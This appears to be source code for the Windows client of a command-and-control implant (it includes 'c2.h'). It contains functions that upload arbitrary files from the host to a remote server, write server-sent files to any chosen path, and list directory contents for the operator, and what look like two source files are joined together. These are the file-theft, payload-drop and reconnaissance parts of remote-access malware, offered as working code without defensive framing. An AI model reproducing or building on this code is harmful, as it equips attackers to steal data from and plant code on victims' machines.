#include "client/file_handler.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include "c2.h"
#include "common.h"
#include <windows.h>

void upload_file_to_server(sock_t sock, char* remote_path) {
    int status = 1;
    if (!remote_path) {
        status = 0;
    }

    size_t file_size = 0;
    char *file_buffer = read_file(remote_path, &file_size);
    if (!file_buffer || file_size > INT_MAX) {
        status = 0;
    }

    // Send status 
    send(sock, &status, sizeof(int), 0);

    // Send payload if status = 1
    if (status) safe_send(sock, file_buffer, DL_FILE_CMD, (int)file_size, 0);
    free(file_buffer);
    free(remote_path);
    return;
}

void download_file_from_server(sock_t sock, char *remote_path) {
    int status = 1;
    if (!remote_path) {
        return;
    }

    int incoming_size = 0;
    BYTE *file_buffer = (BYTE*)safe_recv(sock, NULL, &incoming_size, 0);
    if (!file_buffer) {
        status = 0;
    }

    if (remote_path[0] == '\0') {
        status = 0;
    }

    FILE *fp = fopen(remote_path, "wb");
    if (!fp) {
        status = 0;
        send(sock, &status, sizeof(int), 0);
        free(file_buffer);
        free(remote_path);
        return;
    }

    size_t expected = (size_t)incoming_size;
    size_t written = expected ? fwrite(file_buffer, 1, expected, fp) : 0;
    fclose(fp);

    if (written != expected) {
        status = 0;
    }
    send(sock, &status, sizeof(int), 0);

    free(remote_path);
    free(file_buffer);
    return;
}

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Browse content in a directory, return csv of type,name,modified
char* browse_dir(const char *path) {
    char search[1024];
    snprintf(search, sizeof(search), "%s\\*", path);

    WIN32_FIND_DATAA data;
    HANDLE h = FindFirstFileA(search, &data);
    if (h == INVALID_HANDLE_VALUE)
        return NULL;

    size_t cap = 1024;
    size_t len = 0;
    char *csv = malloc(cap);
    if (!csv) {
        FindClose(h);
        return NULL;
    }

    // Header
    const char *header = "type,name,modified\n";
    strcpy(csv, header);
    len = strlen(header);

    do {
        const char *name = data.cFileName;

        // Skip . and ..
        if (strcmp(name, ".") == 0 || strcmp(name, "..") == 0)
            continue;

        const char *type =
            (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            ? "folder"
            : "file";

        // Convert FILETIME -> local SYSTEMTIME
        FILETIME local_ft;
        SYSTEMTIME st;
        FileTimeToLocalFileTime(&data.ftLastWriteTime, &local_ft);
        FileTimeToSystemTime(&local_ft, &st);

        char timebuf[32];
        snprintf(timebuf, sizeof(timebuf),
                 "%04d-%02d-%02d %02d:%02d:%02d",
                 st.wYear, st.wMonth, st.wDay,
                 st.wHour, st.wMinute, st.wSecond);

        char row[1024];
        snprintf(row, sizeof(row), "%s,%s,%s\n", type, name, timebuf);

        size_t row_len = strlen(row);

        if (len + row_len + 1 > cap) {
            cap *= 2;
            char *tmp = realloc(csv, cap);
            if (!tmp) {
                free(csv);
                FindClose(h);
                return NULL;
            }
            csv = tmp;
        }

        memcpy(csv + len, row, row_len);
        len += row_len;
        csv[len] = '\0';

    } while (FindNextFileA(h, &data));

    FindClose(h);
    return csv;
}
